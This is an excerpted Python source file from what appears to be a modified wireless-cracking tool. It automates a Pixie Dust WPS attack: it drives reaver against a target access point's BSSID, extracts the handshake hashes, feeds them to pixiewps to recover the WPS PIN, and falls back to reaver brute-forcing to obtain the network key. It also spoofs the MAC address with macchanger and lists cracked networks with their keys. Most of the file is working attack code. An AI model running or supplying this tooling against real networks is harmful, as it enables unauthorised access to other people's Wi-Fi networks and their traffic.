...
def banner():
	...
	print G+"           "+GR+"/       \\"+G+"             "
	print G+""
	print G+"modified by aanarchyy(aanarchyy@gmail.com)"
...
def get_iface():
	...
	monitor2 = monitors[i-1]
	monitort = monitor2.split('\t',2)[1]
	monitor = monitors[i-1][:monitors[i-1].find('\t')]
	if monitor.startswith('phy'): monitor = monitort		
	#mac_anonymize(monitor)
...
def wps_check_targets(targets, cap_file, verbose=True):
	...
	# Check if new 'changed version of wash that swapped the -C functionality
	# for no apparent reason' exists...

	reaver_check = Popen(program_name, stdout=PIPE, stderr=DN)

	for line in reaver_check.communicate()[0].split('\n'):
		newreav = line.find("Wiire")
		if newreav > 0: break
...
def generate_random_mac(old_mac):
	...
	"""
	if ORIGINAL_IFACE_MAC == old_mac:return
	random.seed()
	new_mac = old_mac[:0].lower().replace('-', ':')
	for i in xrange(0, 12):
		if i % 2 == 0 and not i == 0: new_mac += ':'
...
def mac_anonymize(iface):
	...
	proc = Popen(['macchanger', '--mac', new_mac, iface], stdout=PIPE, stderr=DN)
	proc.wait()
...
def exit_gracefully(code=0):
	...
	#mac_change_back() #no longer needed
	...
	if program_exists('tshark'):
		...
		for client in clients:
			...
			for line in lines:
				...
				if len(fields) < 8:msg = fields[9][0]      # The message number (1, 2, 3, or 4)
				#msg = fields[-1][0]
...
def wps_attack(iface, target):
	...
	print GR+' [0:00:00]'+W+' initializing %sPixieWPS attack%s on %s' % \
	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')\r'+W)

	p_start = int(time.time())
	pixie=False
	pixie_exit=False
	pixie_fail=False
	p_run = (p_start + PIXIE_TIMEOUT)
	...
	p_out = open(temp + "reaver_out.out", "w")
	#Run reaver to collect hashes
	#Report when each hash is found


	reaver_check = Popen("reaver", stdout=PIPE, stderr=DN)

	for line in reaver_check.communicate()[0].split('\n'):
		newreav = line.find("kib0rg")
		if newreav > 0: break
	
	if newreav > 0:
		pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vvv", "--no-nacks", "-L", "-a", "-P" ], stdout=p_out).pid
	else:

		pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "--no-nacks", "-L", "-a", "-P" ], stdout=p_out).pid
	
	#print 'Running reaver -i %s -c %s -b %s -vv -N -L -a -P' % (iface, target.channel, target.bssid),
	p = open(temp + "reaver_out.out")    
	try:
		while pixie_exit == False:
			while pixie == False or pixie_exit == False:
				time.sleep(1)

				pixieprog=time.time()-p_start
				print ' %s Waiting' % \
					(W+sec_to_hms(pixieprog)),
				print '\r',
				stdout.flush()

				line = p.readline()
				if "Detected AP rate limiting" in line and locked == "":                                                                                                     
					print GR+' [+]'+G+' WPS LOCKED!            '                                                                                         
					locked="1"
					#Ask what to do here

				if "E-Nonce:" in line and ENonce == "":                                                                                                     
					ENonce=line.split(':',1)[1].strip()
					print GR+' [+]'+G+' E-Nonce found'                                                                                         
					p_run=p_run+PIXIE_ADD_TO 
					hash_suc = hash_suc + 1
					#print ENonce
				if "PKE:" in line and PKE == "":
					print GR+' [+]'+G+' PKE hash found'
					PKE=line.split(':',1)[1].strip()
					p_run=p_run+PIXIE_ADD_TO                                    
					hash_suc = hash_suc + 1
					#print PKE 
                                if "WPS Manufacturer" in line and mfr == "":                                   
                                        mfr=line.split(':',1)[1].strip()
					print GR+' [+]'+G+' Manufacturer: '+W+' %s ' % (mfr)    
                                if "WPS Model Name" in line and modelna == "":                                      
                                        modelna=line.split(':',1)[1].strip()
					print GR+' [+]'+G+' Model Name: '+W+' %s ' % (modelna)   
  
                                if "WPS Model Number" in line and modelno == "":                                      
                                        modelno=line.split(':',1)[1].strip()
					print GR+' [+]'+G+' Model Number: '+W+' %s ' % (modelno)   
                                if "Access Point Serial Number" in line and serial == "":                               
                                        serial=line.split(':',1)[1].strip()
					print GR+' [+]'+G+' Serial: '+W+' %s ' % (serial)
       			        if "PKR:" in line and PKR == "":                 
       		        	        print GR+' [+]'+G+' PKR hash found            '     
					PKR=line.split(':',1)[1].strip()
					p_run=p_run+PIXIE_ADD_TO                                      
					hash_suc = hash_suc + 1
					#print PKR
				if "AuthKey:" in line and AuthKey == "":
					print GR+' [+]'+G+' Authkey found            '
					AuthKey=line.split(':',1)[1].strip()
					p_run=p_run+PIXIE_ADD_TO                                      
					hash_suc = hash_suc + 1
					#print AuthKey
				if "E-Hash1" in line and EHash1 == "":
					print GR+' [+]'+G+' E-Hash1 found            '
				...
				if "E-Hash2" in line:
					...
					print GR+' [+]'+G+' E-Hash2 found            '
					pixie = True
					pixie_exit = True

				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
					pcompleted=PIXIE_TIMEOUT + (PIXIE_ADD_TO * hash_suc)
					print R+'\n [!]'+O+' unable to complete in %d seconds' % (pcompleted)
					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
		...
		print R+'\n (^C)'+O+' Pixiewps attack interrupted'+W
		if ENDLESS == 0:
			if len(CRACKED_TARGETS) == 0:
				print R+' [!]'+O+' there are no cracked access points'+W
				exit_gracefully(1)
			print GR+' [+]'+W+' '+W+'previously cracked access points'+W+':'
			for victim in CRACKED_TARGETS:
				print '     %s (%s) : "%s"' % (C+victim.ssid+W, C+victim.bssid+W, G+victim.key+W)
	...
	if pixie == True:
		print GR+' [+]'+G+' Cracking using pixiewps...'

		fin2 = open(temp + "fPixiewpsIn.txt", "w")
		fout2 = open(temp + "fPixiewpsOut.txt", "w")
		ferr2 = open(temp + "fPixiewpsErrors.txt", "w")

		#Stuff the hashes into pixiewps	

		runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", ENonce ],stdin=fin2, stdout=fout2, stderr=ferr2)
		#runpixie=Popen(["pixiewps", 
		#			"-n",ENonce, 
		#			"-e",PKE, 
		#			"-s",EHash1, 
		#			"-z",EHash2, 
		#			"-a",AuthKey, 
		#			"-r",PKR ])
		#print 'pixiewps  -e %s -r %s -s %s -z %s -a %s -n %s' % (PKE, PKR, EHash1, EHash2, AuthKey, ENonce)
		Popen.wait(runpixie)
		f = open(temp + 'fPixiewpsOut.txt')
		line="s"
		while line:
			line = f.readline()
			if "WPS pin:" in line:
		...
		os.remove(temp + "fPixiewpsErrors.txt")
		os.remove(temp + "fPixiewpsIn.txt")
		os.remove(temp + "fPixiewpsOut.txt")	
	#print WPSpin ##AA
	if WPSpin=="WPS pin not found!" or WPSpin=="":	#Crap, timed out or didn't work. Run a regular reaver brute-force

		print GR+'\n [+]'+G+' Pixiewps attack failed!'
		#pixie_fail=True
		cmd = ['reaver',
			'-i', iface,
		       	'-b', target.bssid,
		...
		WPSpin=WPSpin.split(':',1)[1].strip()
		#WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
		print GR+'\n [+]'+G+' PIN found:     %s' % (C+WPSpin+W)
		if PIXIE_NOPSK == False:print GR+' [+]'+G+' Handing pin to reaver'
	cmd = ['reaver',
		'-i', iface,
	       	'-b', target.bssid,
	       	'-o', temp + 'out.out', # Dump output to file to be monitored
	        '--pin', WPSpin, # Try pin found by pixiewps
	        '-c', target.channel,
	        '-vv']  # verbose output
	...
	if PIXIE_NOPSK == False and pixie_fail == False:
		print GR+'\n [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
